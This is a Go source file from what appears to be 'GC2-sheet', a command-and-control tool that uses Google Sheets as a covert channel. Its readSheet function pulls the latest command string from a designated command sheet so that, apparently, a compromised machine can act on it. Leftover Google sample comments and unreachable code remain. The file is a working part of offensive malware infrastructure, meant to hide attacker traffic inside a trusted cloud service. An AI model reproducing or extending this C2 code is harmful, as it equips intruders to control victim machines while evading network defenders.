package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"google.golang.org/api/sheets/v4"
	"log"
	"strconv"
)

func readSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet) string {

	// Prints the names and majors of students in a sample spreadsheet:
	// https://docs.google.com/spreadsheets/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit
	// spreadsheetId := "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms"
	spreadsheetId := spreadSheet.SpreadSheetId


	sheetName := spreadSheet.CommandSheet.Name

	rangeCell := utils.GetLastCommand(spreadSheet).RangeIn
	rangeId := strconv.Itoa(utils.GetLastCommand(spreadSheet).RangeId)
	// Example: Sheet1!A2
	readRange := sheetName + rangeCell + rangeId


	resp, err := client.Spreadsheets.Values.Get(spreadsheetId, readRange).Do()
	if err != nil {
		log.Fatal("Unable to retrieve data from sheet: " + err.Error())
	}

	if len(resp.Values) == 0 {
		return ""
		log.Println("No data found.")
	} else {
		/*fmt.Println("Name, Major:")
		for _, row := range resp.Values {
			// Print columns A and E, which correspond to indices 0 and 4.
			fmt.Printf("%s\n", row[0])
		}*/

		// Get result
		row := resp.Values[0]
		var result string
		result =  fmt.Sprintf("%v", row[0])
		return result

	}

	return ""
}
